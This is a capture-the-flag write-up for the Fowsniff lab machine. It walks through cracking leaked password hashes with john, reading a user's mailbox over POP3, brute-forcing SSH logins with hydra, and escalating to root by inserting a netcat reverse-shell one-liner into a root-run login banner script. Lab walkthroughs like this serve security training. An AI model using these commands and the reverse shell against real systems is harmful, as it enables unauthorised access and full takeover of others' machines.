# FOWSNIFF CTF

## BASIC INFO
```
export IP=10.10.199.90

open ports:
	22/tcp 		ssh
	80/tcp 		http
	110/tcp		pop3
	143/tcp		imap

```

> - **What was seina's password to the email service?**
>> scoobydoo2


> - **Looking through her emails, what was a temporary password set for her?**
>> S1ck3nBluff+secureshell

This challenge is kinda all over the place. So let's start from begining.

Navigating to the IP privided shows a webpage with name of fowsniff.corp. Search it up on google and we can find a Twitter of the company which is pwned. And a list of usernames and password hash is leaked. Copy it down and crack it with john.`john leaked.hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt`. Now we have a list of usernames and passwords.

Next up, login to the pop3 with the following command.
```bash
nc $IP 110
USER seina
PASS scoobydoo2
#Then we need to list all the mails she received.
LIST
RETR 1
```
In this mail we can see that the temporary ssh password is set to 
`S1ck3nBluff+secureshell`

Now exit the pop3 and use hydra to brute-force which user haven't change their password yet.`hydra -L usernames.txt -p S1ck3nBluff+secureshell ssh://$IP`. Looks like baksteen haven't change yet. Log in to ssh with that credentials.

Once we logged in, use `find / -group users 2>/dev/null` to locate file which we can edit as users group. Found a file in /opt/cube. Remember the banner we saw when log in through ssh? This looks like it and it is run as root. So we insert a reverse shell into it.
```bash
nano cube.sh
#Copy the command below and paste it in the file.
#Remember to moify the host IP and port
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <our IP> <PORT> >/tmp/f
```

After we set up a listener on our machine, exit and log back in to baksteen's account through ssh. Now we are root.